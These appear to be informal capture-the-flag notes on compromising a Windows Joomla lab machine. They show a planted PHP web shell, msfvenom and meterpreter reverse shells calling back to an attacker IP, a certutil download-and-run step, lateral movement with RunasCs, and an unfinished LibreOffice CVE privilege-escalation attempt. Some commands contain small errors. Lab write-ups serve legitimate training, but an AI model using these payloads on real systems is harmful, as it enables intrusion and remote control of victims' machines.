rustscan -a 10.10.11.3 -- -sV -Pn
nmap:
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
80/tcp    open  http          syn-ack Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
| http-methods: 
using administrator and playboy69 creds to enter /administrator to enter admin dashboard

in system we can change the cassiopeia templates

adding the one of the php:

echo(system($_GET[0]));
die;

in url we enter:
10.10.11.3/templates/cassiopeia/component.php?0= and the command we want to use

using whoami and we get the responds:
office\web_account

crafting reverse shell:
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.125 LPORT=4445 -f exe -o revs45.exe
 and using msfconsole:
 use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST
set lport
run

set python3 -m server.http 80

using certutil%20-urlcache%20-f%20http://10.10.16.125:80/revs45.exe%20revs45.exe in urlbased 

downloading the file and now we run it

start%20revs45.exe and we get the reverse shell

so we get the reverse shell as web_account

now we want to enter as tstark

we need to upload a new payload and runascs.exe 

RunasCs.exe "tstark" "playboy69" "C:\xampp\htdocs\joomla\templates\cassiopeia\r46.exe"

and we get the shell as tstark

now we go cd c:\Users\tstark\Desktop> and get the user flag:
    c5bb6829dfd26187aaf6f305e5ee179b

to escalate privileges we gonna be using LibreOffice 5 that located in c:\Program Files\LibreOffice 5>

There is a CVE for this program 

https://github.com/elweth-sec/CVE-2023-2255

downloading it 

making 1 more payload via msfconsole -x "use exploits/multi/handler; set lhost tun0;set lport 4447 ;set payload windows/x64/meterpreter/reverse_tcp; exploit

now we need to create a RCE trigger using the CVE we downloaded:
    python3 CVE-2023-2255.py --cmd "C:\users\public\r47.exe"  
    File output.odt has been created !

now we need to upload it to machine as web_account to  C:\xampp\htdocs\internal\applications>

still doesntwork --- 

